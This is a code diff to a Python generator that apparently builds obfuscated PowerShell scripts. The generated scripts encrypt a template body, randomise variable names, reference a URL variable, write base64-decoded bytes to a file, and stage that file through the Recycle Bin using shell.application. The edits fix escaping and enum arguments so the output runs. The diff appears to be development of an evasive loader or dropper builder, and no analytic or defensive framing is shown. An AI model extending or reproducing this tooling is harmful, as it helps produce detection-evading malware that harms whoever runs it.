@@ -209,6 +209,7 @@ def generate_ps1(encrypt_map, decrypt_map):
 
     # ── encrypt the template body ──
     encrypted_body = encrypt_string(script_template, encrypt_map)
+    encrypted_body = encrypted_body.replace("'", "''")  # escape for PS1 single-quoted string
 
     # ── random variable names for the wrapper ──
     var_url = random_var_name()
@@ -309,7 +310,8 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
         f'[io.file]::writeallbytes(${dv5}, [convert]::frombase64string(${dv7}))\n'
         f'add-type -assemblyname microsoft.visualbasic\n'
         f'[microsoft.visualbasic.fileio.filesystem]::deletefile(${dv5}, '
-        f"'OnlyErrorDialogs', 'SendToRecycleBin')\n"
+        f'[microsoft.visualbasic.fileio.uioption]::OnlyErrorDialogs, '
+        f'[microsoft.visualbasic.fileio.recycleoption]::SendToRecycleBin)\n'
         f'start-sleep -milliseconds 800\n'
         f'${dv8} = new-object -comobject shell.application\n'
         f'${dv9} = ${dv8}.namespace(10)\n'
@@ -329,6 +331,7 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
 
     # ── encrypt the template body ──
     encrypted_body = encrypt_string(script_template, encrypt_map)
+    encrypted_body = encrypted_body.replace("'", "''")  # escape for PS1 single-quoted string
 
     # ── random variable names for wrapper ──
     var_url = random_var_name()
